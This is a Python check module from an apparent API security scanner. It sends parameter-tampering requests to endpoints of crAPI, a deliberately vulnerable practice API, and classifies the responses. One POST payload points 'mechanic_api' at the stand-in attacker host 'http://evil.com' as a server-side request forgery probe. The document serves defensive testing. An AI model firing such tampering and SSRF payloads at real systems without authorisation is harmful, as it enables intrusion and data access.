import requests
from agent.checks.auth import get_valid_token

def check_parameter_tampering(endpoints, config):
    base_url = config["target"]["base_url"]
    findings = []

    token = get_valid_token(base_url, config)
    if not token:
        findings.append({
            "check": "Parameter Tampering",
            "severity": "ERROR",
            "endpoint": "N/A",
            "method": "N/A",
            "detail": "Could not obtain valid token to run test",
        })
        return findings

    headers = {"Authorization": f"Bearer {token}"}

    # crAPI: access another user's vehicle data by manipulating ID
    tamper_targets = [
        {"url": base_url + "/workshop/api/merchant/contact_mechanic", "method": "POST",
         "payload": {"mechanic_api": "http://evil.com", "problem_details": "test",
                     "vehicle_id": "invalid-id-999", "mechanic_code": "TRAC_JME"}},
        {"url": base_url + "/identity/api/v2/user/dashboard", "method": "GET",
         "payload": None},
    ]

    for target in tamper_targets:
        try:
            if target["method"] == "POST":
                resp = requests.post(target["url"], json=target["payload"],
                                     headers=headers, timeout=5)
            else:
                resp = requests.get(target["url"], headers=headers, timeout=5)

            status = resp.status_code
            path = target["url"].replace(base_url, "")

            if status == 200:
                findings.append({
                    "check": "Parameter Tampering",
                    "severity": "MEDIUM",
                    "endpoint": path,
                    "method": target["method"],
                    "detail": f"Server accepted tampered payload and returned 200",
                })
            else:
                findings.append({
                    "check": "Parameter Tampering",
                    "severity": "PASS",
                    "endpoint": path,
                    "method": target["method"],
                    "detail": f"Returned {status} for tampered request",
                })
        except Exception as e:
            pass

    return findings